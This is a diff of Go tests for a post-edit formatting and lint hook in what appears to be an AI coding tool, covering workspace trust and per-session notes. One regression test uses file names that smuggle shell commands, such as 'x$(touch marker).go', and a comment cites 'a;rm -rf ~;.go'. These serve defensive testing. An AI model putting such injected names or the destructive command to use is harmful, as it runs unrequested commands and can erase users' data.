-// TestSplitAndCheckArgsPinsNPXBeforeTheTool is the placement half of the
-// npx no-install pin: the hook's argv builder must insert --no right after
-// `npx` (index 1), BEFORE the tool name. npx stops parsing its own options
-// at the first positional and forwards everything after it to the tool, so
-// a trailing pin would land in eslint/prettier's argv as THEIR flag —
-// eslint would fail with an invalid option, and npx itself would still
-// perform the registry install the pin is meant to prevent.
-func TestSplitAndCheckArgsPinsNPXBeforeTheTool(t *testing.T) {
-	for _, tc := range []struct {
-		name     string
-		template string
-	}{
-		{"declared-eslint", "npx eslint {file}"},
-		{"discovered-prettier-fallback", "npx prettier --write {file}"},
-		{"already-pinned-is-idempotent", "npx --no eslint {file}"},
-	} {
-		t.Run(tc.name, func(t *testing.T) {
-			argv, ok := splitAndCheckArgs(tc.template, "", "a.ts")
-			if !ok {
-				t.Fatalf("an allowlisted npx template must pass the argument check, got %v", argv)
-			}
-			if len(argv) < 2 {
-				t.Fatalf("argv = %v, want at least npx + --no", argv)
-			}
-			if argv[0] != "npx" || argv[1] != "--no" {
-				t.Errorf("argv[:2] = %v, want [npx --no] — the pin must precede the tool name (full: %v)", argv[:2], argv)
-			}
-		})
-	}
-}
-
 // TestPostEditHookDoesNotShellInject is the security regression test for the
 // round-1 blocker: a write_file of a file NAMED like a shell payload must
 // not execute it. Under the old bash -c splice, "x$(touch marker).go" ran
-// `touch marker` (and "a;rm -rf ~;.go" would have chained a command) —
-// bypassing shellrisk entirely. The hook now splits the allowlisted template
-// and execs it as argv, so the name is one inert argument, the marker is
-// never created, and the edit still succeeds.
+// `touch marker` (and "a;rm -rf ~;.go" would have chained a command). The
+// hook splits the template and execs it as argv, so the name is one inert
+// argument, the marker is never created, and the edit still succeeds — on
+// a TRUSTED workspace (the hook runs nothing untrusted, so the injection
+// surface is absent there by construction).
 func TestPostEditHookDoesNotShellInject(t *testing.T) {
 	for _, evilName := range []string{"x$(touch marker).go", "a;touch marker;.go"} {
 		t.Run(evilName, func(t *testing.T) {
@@ -653,19 +657,16 @@ func TestPostEditHookDoesNotShellInject(t *testing.T) {
 			writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
 
 			out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-				map[string]any{"path": evilName, "content": "package main\n"}), hookDeps{cmds: goRepoCmds()})
+				map[string]any{"path": evilName, "content": "package main\n"}), hookDeps{cmds: goRepoCmds(), trusted: true})
 			if err != nil {
 				t.Fatalf("write_file must succeed regardless of the file name, got %v", err)
 			}
 			if _, statErr := os.Stat(filepath.Join(root, "marker")); statErr == nil {
 				t.Fatalf("a marker file exists — the file name was executed through a shell (result: %q)", out)
 			}
-			// The path is shell-shaped, so the hook declines to run the
-			// allowlisted commands on it (the refusal is visible for format)
-			// — but it never blocks the write.
-			if !strings.Contains(out, "note:") {
-				t.Errorf("expected the argument-refusal note, got %q", out)
-			}
+			// The argv contract passes the shell-shaped name through as ONE
+			// inert argument (there is no shell to re-parse it); the write
+			// result must still lead.
 			if !strings.HasPrefix(out, "wrote ") {
 				t.Errorf("the write result must still lead, got %q", out)
 			}
@@ -676,14 +677,14 @@ func TestPostEditHookDoesNotShellInject(t *testing.T) {
 // TestPostEditHookSkipsNonSourceFiles is the Extends-gate behavior: in a Go
 // project (gofmt restricted to .go), a write_file of a README.md must come
 // back as EXACTLY the plain write result — no format run, no spurious
-// 'ran with an error' note, no lint note.
+// 'ran with an error' note, no lint note (trusted workspace).
 func TestPostEditHookSkipsNonSourceFiles(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
 	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
 
 	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "README.md", "content": "# t\n"}), hookDeps{cmds: goRepoCmds()})
+		map[string]any{"path": "README.md", "content": "# t\n"}), hookDeps{cmds: goRepoCmds(), trusted: true})
 	if err != nil {
 		t.Fatalf("write_file: %v", err)
 	}
@@ -693,11 +694,12 @@ func TestPostEditHookSkipsNonSourceFiles(t *testing.T) {
 }
 
 // TestPostEditHookWholePackageVetIsSilent pins the {dir} substitution against
-// the real toolchain: two files in one package where a.go CALLS a function
-// defined in b.go. A per-file `go vet a.go` would type-check a.go as its own
-// package and report a spurious 'undefined: helper' on every edit; the
-// whole-package `go vet ./sub` type-checks both files together and is clean
-// — so the hook must run it and stay silent (no note at all).
+// the real toolchain (trusted workspace): two files in one package where
+// a.go CALLS a function defined in b.go. A per-file `go vet a.go` would
+// type-check a.go as its own package and report a spurious 'undefined:
+// helper' on every edit; the whole-package `go vet ./sub` type-checks both
+// files together and is clean — so the hook must run it and stay silent
+// (no note at all).
 func TestPostEditHookWholePackageVetIsSilent(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
@@ -712,7 +714,7 @@ func TestPostEditHookWholePackageVetIsSilent(t *testing.T) {
 	// a.go is unformatted (so the format note IS expected) and calls
 	// helper from its sibling file.
 	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "sub/a.go", "content": "package sub\n\nfunc main() {\n  _ = helper()\n}\n"}), hookDeps{cmds: goRepoCmds()})
+		map[string]any{"path": "sub/a.go", "content": "package sub\n\nfunc main() {\n  _ = helper()\n}\n"}), hookDeps{cmds: goRepoCmds(), trusted: true})
 	if err != nil {
 		t.Fatalf("write_file: %v", err)
 	}
@@ -730,5 +732,54 @@ func TestPostEditHookWholePackageVetIsSilent(t *testing.T) {
 	// other vet finding would surface as a lint note.
 	if strings.Contains(out, "lint") || strings.Contains(out, "undefined:") || strings.Contains(out, "vet") {
 		t.Errorf("whole-package vet of a cross-file package must stay silent, got %q", out)
+	}
+}
+
+// TestPostEditHookInactiveNoteIsOncePerSession pins the per-session state
+// end-to-end through the REAL write_file path (Execute →
+// runProjectCommandHook → firstProjectCommandRunOf): a session (one hookDeps
+// with its own PostEditHookState) on an untrusted workspace announces the
+// "hook inactive" note on its FIRST write/edit and stays silent on later
+// ones — the state lives on the session, not on the tool call.
+func TestPostEditHookInactiveNoteIsOncePerSession(t *testing.T) {
+	root := t.TempDir()
+	t.Chdir(root)
+	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
+
+	// One session: the explicit shared state pointer is the session's unit
+	// of "once per session" (value copies of deps share the pointer).
+	deps := hookDeps{cmds: goRepoCmds(), state: &PostEditHookState{}} // trusted=false
+
+	out1, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
+		map[string]any{"path": "a.go", "content": "package main\n"}), deps)
+	if err != nil {
+		t.Fatalf("write_file: %v", err)
+	}
+	if !strings.Contains(out1, "post-edit hook inactive: this workspace isn't trusted") {
+		t.Errorf("the first untrusted write of a session must carry the inactive note, got %q", out1)
+	}
+
+	out2, err := Execute(context.Background(), callArgs(t, FunctionEditFile, map[string]any{
+		"path":       "a.go",
+		"old_string": "package main",
+		"new_string": "package main // edited",
+	}), deps)
+	if err != nil {
+		t.Fatalf("edit_file: %v", err)
+	}
+	if strings.Contains(out2, "inactive") {
+		t.Errorf("the inactive note must NOT repeat on a later edit of the same session, got %q", out2)
+	}
+
+	// A NEW session (its own state pointer) gets its own flag: the note
+	// fires again.
+	fresh := hookDeps{cmds: goRepoCmds(), state: &PostEditHookState{}}
+	out3, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
+		map[string]any{"path": "c.go", "content": "package main\n"}), fresh)
+	if err != nil {
+		t.Fatalf("write_file: %v", err)
+	}
+	if !strings.Contains(out3, "post-edit hook inactive: this workspace isn't trusted") {
+		t.Errorf("a new session's first untrusted write must carry the inactive note again, got %q", out3)
 	}
 }
